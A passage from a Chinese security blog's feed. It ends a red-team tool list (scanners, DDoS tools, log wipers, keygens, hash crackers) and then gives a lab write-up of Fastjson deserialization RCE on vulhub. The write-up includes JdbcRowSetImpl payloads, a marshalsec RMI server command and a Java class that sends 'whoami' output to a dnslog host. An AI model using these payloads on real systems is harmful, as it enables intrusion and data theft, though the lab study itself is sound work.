class="line">https://github.com/robbyFux/Ragpicker 恶意软件信息爬取汇总分析</span><br><span class="line">https://github.com/phage-nz/ph0neutria 恶意软件信息爬取汇总分析</span><br><span class="line">https://github.com/JR0driguezB/malware_configs 常见恶意配置文件</span><br><span class="line">https://github.com/sfaci/masc 扫描网站中的恶意软件, 以及其他一些网站维护功能</span><br><span class="line">https://github.com/Neo23x0/munin 依据文件 Hash 从各种在线恶意软件扫描服务提取信息的工具</span><br><span class="line">https://github.com/1lastBr3ath/drmine 自动化检测网页是否包含挖矿脚本的工具</span><br><span class="line">https://github.com/KasperskyLab/klara 卡巴斯基开源基于Yara的分布式恶意软件扫描系统,</span><br><span class="line">https://github.com/botherder/kraken go，实现的Yara恶意软件扫描器</span><br><span class="line">https://github.com/alexandreborges/malwoverview simple，将恶意文件进行快速分类</span><br><span class="line">https://github.com/joxeankoret/pigaios 直接对比源代码与编译的二进制文件</span><br><span class="line">https://github.com/viper-framework py2，二进制分析和管理框架，对恶意文件进行分析</span><br><span class="line">https://github.com/netxfly/sec_check 通过信息采集（账户、连接、端口等）与yara扫描进行安全检测</span><br><span class="line">https://github.com/nao-sec/tknk_scanner yara引擎为基础的恶意软件识别框架</span><br><span class="line">https://github.com/felixweyne/ProcessSpawnControl powershell,对恶意程序进行检测与监控</span><br><span class="line">https://github.com/Aurore54F/JaSt 使用语法检测恶意/混淆的JS文件，https://www.blackhoodie.re/assets/archive/JaSt_blackhoodie.pdfhttp://edr.sangfor.com.cn/ win，Linux下恶意软件、webshell检测查杀工具</span><br><span class="line">http://www.clamav.net/downloads 病毒查杀软件</span><br><span class="line">http://www.chkrootkit.org/ rootkit检测工具</span><br><span class="line">http://rootkit.nl/projects/rootkit_hunter.html rootkit检测工具</span><br></pre></td></tr></table></figure><h2 id="恶意文件检测之Webshell查杀扫描"><a href="#恶意文件检测之Webshell查杀扫描" class="headerlink" title="恶意文件检测之Webshell查杀扫描"></a><strong>恶意文件检测之Webshell查杀扫描</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http://www.safedog.cn/ 安全狗web防火墙</span><br><span class="line">http://d99net.net/ win，啊D出品D盾_防火墙，包含waf与webshel检测功能</span><br><span class="line">https://github.com/he1m4n6a/findWebshell py，webshell检查工具，可后期添加后门指纹，很强大</span><br><span class="line">https://github.com/ym2011/ScanBackdoor 一款简洁的Webshell扫描工具</span><br><span class="line">https://github.com/erevus-cn/scan_webshell webshell扫描工具</span><br><span class="line">https://github.com/yassineaddi/BackdoorMan 可对指定目录进行php webshell检测</span><br><span class="line">https://github.com/nbs-system/php-malware-finder 一款高效率PHP-webshell扫描工具</span><br><span class="line">https://github.com/emposha/PHP-Shell-Detector 测试效率高达99%的webshell检测工具</span><br><span class="line">https://github.com/emposha/Shell-Detector Webshell扫描工具，支持php/perl/asp/aspx webshell扫描</span><br></pre></td></tr></table></figure><h2 id="压力测试与DDOS相关"><a href="#压力测试与DDOS相关" class="headerlink" title="压力测试与DDOS相关"></a><strong>压力测试与DDOS相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ywjt/Dshield DDOS防护</span><br><span class="line">https://github.com/NewEraCracker/LOIC/ 一个为Windows设计的网络压力测试工具现已支持Mac OS——译者注</span><br><span class="line">https://github.com/649/Memcrashed-DDoS-Exploit 利用Memcached服务器的DDoS攻击工具, 向Memcached服务器发送伪造的UDP数据包使其向攻击目标回复大量数据包</span><br><span class="line">https://github.com/jseidl/GoldenEye py，DOS测试</span><br><span class="line">https://github.com/mschwager/dhcpwn DHCP IP 资源耗尽攻击工具</span><br><span class="line">https://github.com/Microsoft/Ethr GO,跨平台,TCP, UDP, HTTP, HTTPS压力测试工具</span><br></pre></td></tr></table></figure><h2 id="匿名信息保护洋葱路由TorBrowser"><a href="#匿名信息保护洋葱路由TorBrowser" class="headerlink" title="匿名信息保护洋葱路由TorBrowser"></a><strong>匿名信息保护洋葱路由TorBrowser</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/leitbogioro/Fuck_Aliyun 关闭阿里云监控服务</span><br><span class="line">https://github.com/Nummer/Destroy-Windows-10-Spying DWS关闭windows监控服务</span><br><span class="line">https://github.com/Rizer0/Log-killer 日志清除，Windows/Linux 服务器中的所有</span><br><span class="line">https://github.com/360-A-Team/EventCleaner 日志擦除工具</span><br><span class="line">https://github.com/s-rah/onionscan darkweb暗网爬虫</span><br><span class="line">https://github.com/globaleaks/Tor2web darkweb暗网代理服务器，将onion的服务变为普通的服务</span><br><span class="line">https://github.com/milesrichardson/docker-onion-nmap 使用nmap扫描Tor网络上隐藏的&quot;onion&quot;服务</span><br><span class="line">https://github.com/GouveaHeitor/nipe 一个使所有流量通过Tor网络发出的脚本</span><br><span class="line">https://github.com/trimstray/multitor 启用多个tor通道转发流量，并设置负载均衡</span><br></pre></td></tr></table></figure><h2 id="爬虫相关"><a href="#爬虫相关" class="headerlink" title="爬虫相关"></a><strong>爬虫相关</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/alphardex/looter 轻量型爬虫框架，类比Scrapy</span><br><span class="line">https://github.com/luyishisi/Anti-Anti-Spider 过反爬虫</span><br><span class="line">https://github.com/xchaoinfo/fuck-login 模拟登录一些常见的网站</span><br><span class="line">https://github.com/Maicius/InterestingCrawler 抓取QQ空间说说内容并进行分析</span><br><span class="line">https://github.com/xjr7670/QQzone_crawler QQ 空间动态爬虫，利用cookie登录获取所有可访问好友空间的动态保存到本地</span><br></pre></td></tr></table></figure><h2 id="在线自服务与工具"><a href="#在线自服务与工具" class="headerlink" title="在线自服务与工具"></a><strong>在线自服务与工具</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/Kickball/awesome-selfhosted awesome系列之自服务应用</span><br><span class="line">https://github.com/littlecodersh/itchat 微信个人号接口、微信机器人及命令行微信</span><br><span class="line">https://github.com/sym233/core-values-encoder js,社会主义核心价值观加密，https://sym233.github.io/core-values-encoder/https://github.com/valentinxxx/nginxconfig.io/ 在线nginx配置文件生成，demo网址https://nginxconfig.io</span><br><span class="line">https://github.com/asciimoo/searx 搭建一个自己的搜索引擎,DEMO网址https://searx.me/</span><br><span class="line">http://sc.ftqq.com/3.version server酱微信通知</span><br><span class="line">https://osint.link Open Source Intelligence (OSINT) Tools &amp; Resources</span><br><span class="line">https://www.wolframalpha.com 根据问题直接给出答案的网站</span><br><span class="line">shodan.io 互联网感知引擎</span><br><span class="line">fofa.so 白帽汇NOSEC</span><br><span class="line">https://www.oshadan.com 傻蛋联网设备搜索_湖南安数网络</span><br><span class="line">zoomeye.org 知道创宇互联网感知引擎</span><br><span class="line">https://sms.cngrok.com/receiving-sms 收码接码</span><br><span class="line">https://www.pdflibr.com/ 收码接码</span><br><span class="line">https://www.fakenamegenerator.com 多国身份信息模拟器</span><br><span class="line">https://recruitin.net Easily use Google to search profiles on LinkedIn</span><br><span class="line">https://www.truthfinder.com 美国公民信息查询</span><br><span class="line">https://verify-email.org 邮件真实性验证</span><br><span class="line">https://safeweb.norton.com 诺顿网站安全检测</span><br><span class="line">http://www.vuln.cn/tools/ftp 在线FTP登录</span><br><span class="line">http://www.link114.cn/title/ 批量查询网站标题</span><br><span class="line">https://www.whatweb.net/ 在线web指纹识别</span><br><span class="line">https://hackertarget.com/ip-tools/ 提供api，ip相关工具、在线扫描器</span><br><span class="line">http://www.webscan.cc/ 同IP网站查询,C段查询,IP反查域名,C段旁注,旁注工具</span><br><span class="line">https://www.phpinfo.me/bing.php 在线旁站查询|C段查询|必应接口C段查询</span><br><span class="line">https://www.phpinfo.me/domain/ 在线子域名爆破</span><br><span class="line">https://www.dnsdb.io DNS查询,子域名查询,IP查询,A记录查询,域名解析,旁站查询</span><br><span class="line">https://dnsdumpster.com/ dns recon and research, find and lookup dns records</span><br><span class="line">http://ip.chaxun.la/ ip反查域名---查询啦</span><br><span class="line">https://habo.qq.com 在线恶意文件检测</span><br><span class="line">https://www.virustotal.com 恶意软件检测</span><br><span class="line">http://r.virscan.org/ 恶意软件检测</span><br><span class="line">https://www.appscan.io 移动软件在线检测</span><br><span class="line">https://www.nomoreransom.org 常见勒索软件分析还原</span><br><span class="line">https://www.cmd5.com/ HASH密码在线破解</span><br><span class="line">https://www.onlinehashcrack.com 密码哈希在线破解，邮件通知</span><br></pre></td></tr></table></figure><h2 id="在线办公套件"><a href="#在线办公套件" class="headerlink" title="在线办公套件"></a><strong>在线办公套件</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">https://sadd.io/ 在线操作系统</span><br><span class="line">https://github.com/zyx0814/dzzoffice 在线办公套件,DEMO网址demo.dzzoffice.com</span><br><span class="line">https://github.com/RobbieHan/gistandard py，基于Django，OA工单办公管理系统</span><br><span class="line">https://github.com/pavanw3b/sh00t PY3,DJANGO，安全测试工单管理</span><br><span class="line">https://github.com/chaitin/strapdown-zeta 基于strapdown.js，长亭二次开发开源的Wiki系统，支持markdown</span><br><span class="line">https://etherpad.net/ 在线可编辑记事本</span><br><span class="line">https://www.upload.ee/ 文件共享平台</span><br><span class="line">https://github.com/micahflee/onionshare 利用onion洋葱服务器匿名文件共享</span><br><span class="line">https://github.com/filebrowser/filebrowser GO,基于Caddy框架的网盘</span><br><span class="line">https://github.com/nextcloud/server php，私有云网盘，owncloud分支</span><br><span class="line">https://github.com/owncloud/core php，私有云网盘，界面不美观</span><br><span class="line">https://github.com/haiwen/seafile C,私有云网盘，速度快，功能少</span><br><span class="line">https://github.com/ymfe/yapi API管理工具</span><br><span class="line">https://thyrsi.com/ 图片上传分享工具</span><br></pre></td></tr></table></figure><h2 id="隐私匿名加密"><a href="#隐私匿名加密" class="headerlink" title="隐私匿名加密"></a><strong>隐私匿名加密</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">https://www.lshack.cn/118/ 在线接收验证码/邮箱/粘贴板/文件传输大集合。</span><br><span class="line">http://bccto.me 一次性邮箱</span><br><span class="line">https://www.guerrillamail.com 一次性邮箱</span><br><span class="line">http://24mail.chacuo.net/ 一次性邮箱</span><br><span class="line">http://www.yopmail.com 一次性邮箱</span><br><span class="line">https://yandex.com/ 非手机邮箱</span><br><span class="line">https://mail.ru/ 非手机邮箱</span><br><span class="line">https://mail.protonmail.com/login 非手机邮箱</span><br><span class="line">https://github.com/walkor/workerman-chat php，在线聊天室，可扩展</span><br><span class="line">https://github.com/hack-chat https://hack.chat/?your-channel js,在线聊天，问号后面跟你的房间名</span><br><span class="line">https://github.com/akaxincom/openzaly java,聊天室，Akaxin为客户端闭源</span><br><span class="line">https://github.com/RocketChat/Rocket.Chat js,在线团队聊天服务器，https://rocket.chat/installhttps://telegram.orghttps://www.whatsapp.comhttps://wire.com/enhttps://signal.orghttp://www.batmessenger.comhttp://sid.co</span><br></pre></td></tr></table></figure><h2 id="在线资源"><a href="#在线资源" class="headerlink" title="在线资源"></a><strong>在线资源</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/DoubleLabyrinth/navicat-keygen navicat注册机</span><br><span class="line">https://github.com/DoubleLabyrinth/MobaXterm-keygen MobaXterm注册机</span><br><span class="line">http://www.zdfans.com zd423 - 软件分享平台领跑者</span><br><span class="line">https://www.flaticon.com 免费图标网站</span><br><span class="line">https://msdn.itellyou.cn 原生镜像</span><br><span class="line">https://www.freenom.com 注册免费域名，dns解析</span><br><span class="line">https://codebeautify.org 在线代码美化</span><br><span class="line">http://patorjk.com Text to ASCII Art Generator</span><br><span class="line">https://www.seopojie.com SPAM,SEO</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/We5ter/Scanners-Box 增加条目，细化分类</span><br><span class="line">https://www.anquanke.com/opensource github搜索引擎</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;项目简介&quot;&gt;&lt;a href=&quot;#项目简介&quot; class=&quot;headerlink&quot; title=&quot;项目简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;项目简介&lt;/strong&gt;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;&lt;em&gt;\&lt;/em&gt;一个 Red Team 攻击的生命周期，整个生命周期包括：信息收集、攻击尝试获得权限、持久性控制、权限提升、网络信息收集、横向移动、数据分析（在这个基础上再做持久化控制）、在所有攻击结束之后清理并退出战场。**&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="红蓝对抗" scheme="http://goudanjun.vip/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>Fastjson漏洞复现和研究</title>
    <link href="http://goudanjun.vip/2021/03/12/Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E7%A0%94%E7%A9%B6.html/"/>
    <id>http://goudanjun.vip/2021/03/12/Fastjson漏洞复现和研究.html/</id>
    <published>2021-03-12T14:51:22.000Z</published>
    <updated>2021-03-23T02:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h1><p>Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。</p><p>Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</p><a id="more"></a><p><a href="https://zhuanlan.zhihu.com/p/157211675?from_voters_page=true" target="_blank" rel="noopener">fastjson各个版本漏洞简介</a></p><p>由于普通序列化的时候各个类的私有属性无法区别，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bicycle</span> <span class="keyword">implements</span> <span class="title">vehicle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal wheels;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">car</span> <span class="keyword">implements</span> <span class="title">vehicle</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Big_Decimal wheels;</span><br><span class="line">    <span class="comment">//省略 setter/getter、toString等</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//序列化之后：</span></span><br><span class="line">toJSONString : &#123;<span class="string">"vehicle"</span>:&#123;<span class="string">"wheels"</span>:<span class="number">2</span>&#125;&#125;</span><br><span class="line"></span><br><span class="line">toJSONString : &#123;<span class="string">"vehicle"</span>:&#123;<span class="string">"wheels"</span>:<span class="number">4</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>所以Fastjson自定义了序列化的方法，引入了 Autotype，在序列化的时候将原始数据类型记录下来</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"vehicle"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.hollis.lab.fastjson.test.bicycle"</span>,</span><br><span class="line">        <span class="attr">"wheels"</span>:<span class="number">2</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"vehicle"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.hollis.lab.fastjson.test.car"</span>,</span><br><span class="line">        <span class="attr">"wheels"</span>:<span class="number">4</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样我们可以利用 @type 的值任意引用 java 的类，从而造成 RCE 漏洞</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="1-2-24："><a href="#1-2-24：" class="headerlink" title="1.2.24："></a>1.2.24：</h2><p>payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://&lt; rmi服务器的IP &gt;:9999/ &lt;Exploit&gt;"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="搭建实验环境："><a href="#搭建实验环境：" class="headerlink" title="搭建实验环境："></a>搭建实验环境：</h3><h4 id="kali-2020"><a href="#kali-2020" class="headerlink" title="kali 2020 :"></a>kali 2020 :</h4><p> IP：192.168.239.134</p><h4 id="搭建vulhub靶场："><a href="#搭建vulhub靶场：" class="headerlink" title="搭建vulhub靶场："></a>搭建vulhub靶场：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/vulhub/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub</span><br><span class="line"><span class="built_in">cd</span> fastjson</span><br><span class="line"><span class="built_in">cd</span> 1.2.24-rce</span><br><span class="line">docker-compose up -d </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span>  1.2.47-rce</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h4><p>1.8.0_281</p><p><img src="https://i.loli.net/2021/03/12/YRFTLlD86e9tirU.png" alt="image-20210312232000792"></p><p>版本不一致的话可以下载该版本，然后切换java版本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">update-alternatives  --install  /usr/bin/java  java  /opt/java/jdk1.8.0_281/bin/java  4</span><br><span class="line">update-alternatives  --config  java</span><br></pre></td></tr></table></figure><h4 id="安装maven："><a href="#安装maven：" class="headerlink" title="安装maven："></a>安装maven：</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget https://mirrors.bfsu.edu.cn/apache/maven/maven-3/3.6.3/binaries/apache-maven-3.6.3-bin.tar.gz</span><br><span class="line">mkdir /opt/maven</span><br><span class="line">tar zxvf apache-maven-3.6.3-bin.tar.gz -C /opt/maven/</span><br><span class="line">vim /etc/profile  <span class="comment">#配置环境变量</span></span><br><span class="line"><span class="comment">#在最下面增加</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/opt/maven/apache-maven-3.6.3</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PATH</span></span><br><span class="line"><span class="comment">#验证maven是否安装成功</span></span><br><span class="line">mvn -version</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/12/4fJiXKI72cEWskh.png" alt="image-20210312232218117"></p><h4 id="安装java反序列化利用工具："><a href="#安装java反序列化利用工具：" class="headerlink" title="安装java反序列化利用工具："></a>安装java反序列化利用工具：</h4><p>marshalsec</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/mbechler/marshalsec.git</span><br><span class="line"><span class="built_in">cd</span> marshalsec/</span><br><span class="line">mvn clean package –DskipTests  <span class="comment">#编译项目</span></span><br></pre></td></tr></table></figure><p>启动rmi服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> target/</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer <span class="string">"http://192.168.239.134:9998/#dnslog"</span> 9999</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/12/tbXq2MNx6DVvszP.png" alt="image-20210312232658834"></p><h4 id="安装靶场服务器："><a href="#安装靶场服务器：" class="headerlink" title="安装靶场服务器："></a>安装靶场服务器：</h4><p>用 java 编译如下文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">dnslog</span></span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"ping user.`whoami`.&lt;dnslog服务器地址&gt;"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成功后将 class 文件放到 kali 中，并在同一目录下启动靶场服务器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 9998</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/12/z2lM5wZ7c69Xfgb.png" alt="image-20210312233722511"></p><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p>启动 fastjson 服务器</p><p><img src="https://i.loli.net/2021/03/12/QbqP4LySKkMg8u9.png" alt="image-20210312234140445"></p></li><li><p>启动 rmi 服务器，记录下dnslog地址</p><p><img src="https://i.loli.net/2021/03/12/iJ5X6u9w2TQZl8F.png" alt="image-20210312234207407"></p><p><img src="https://i.loli.net/2021/03/12/3G2spUNDrJKyi5h.png" alt="image-20210312234235446"></p></li><li><p>更改java文件中的dnslog服务器地址，并编译该Java文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String[] commands = &#123; <span class="string">"/bin/sh"</span>, <span class="string">"-c"</span>, <span class="string">"ping user.`whoami`.uvv1ep.dnslog.cn"</span>&#125;;</span><br></pre></td></tr></table></figure></li><li><p>将class文件放入kali中，启动靶场服务器</p><p><img src="https://i.loli.net/2021/03/12/z2lM5wZ7c69Xfgb.png" alt="image-20210312233722511"></p></li><li><p>访问 fastjson，将数据包改为 POST 请求，并在数据部分添加 payload</p><p><img src="https://i.loli.net/2021/03/12/slTjDfxywF21aiB.png" alt="image-20210312234426060"></p></li><li><p>刷新 dnslog 可看到有一条请求，则成功 rce</p><p><img src="https://i.loli.net/2021/03/12/gjubXL4h6p2erUR.png" alt="image-20210312234445371"></p></li></ol><h2 id="1-2-47："><a href="#1-2-47：" class="headerlink" title="1.2.47："></a>1.2.47：</h2><p>该版本中将AutoType关闭了，但是该版本会首先从全局缓存中获取类</p><p>全局缓存中java.lang.Class类对应的deserializer为MiscCodec，反序列化时会取json串中的val值并加载这个val对应的类。</p><p>如果fastjson cache为true，就会缓存这个val对应的class到全局缓存中</p><p>所以只需将1.2.24中的payload更换为</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://192.168.239.134:9999/dnslog"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/13/HhF14aPkXBVNI8p.png" alt="image-20210313001102697"></p><p><img src="https://i.loli.net/2021/03/13/dgFrIOXvRq79EU1.png" alt="image-20210313001027020"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;漏洞简述&quot;&gt;&lt;a href=&quot;#漏洞简述&quot; class=&quot;headerlink&quot; title=&quot;漏洞简述&quot;&gt;&lt;/a&gt;漏洞简述&lt;/h1&gt;&lt;p&gt;Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。&lt;/p&gt;
&lt;p&gt;Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。&lt;/p&gt;
    
    </summary>
    
    
      <category term="反序列化" scheme="http://goudanjun.vip/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
      <category term="java" scheme="http://goudanjun.vip/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>sql注入报错函数总结</title>
    <link href="http://goudanjun.vip/2021/03/11/sql%E6%B3%A8%E5%85%A5%E6%8A%A5%E9%94%99%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93.html/"/>
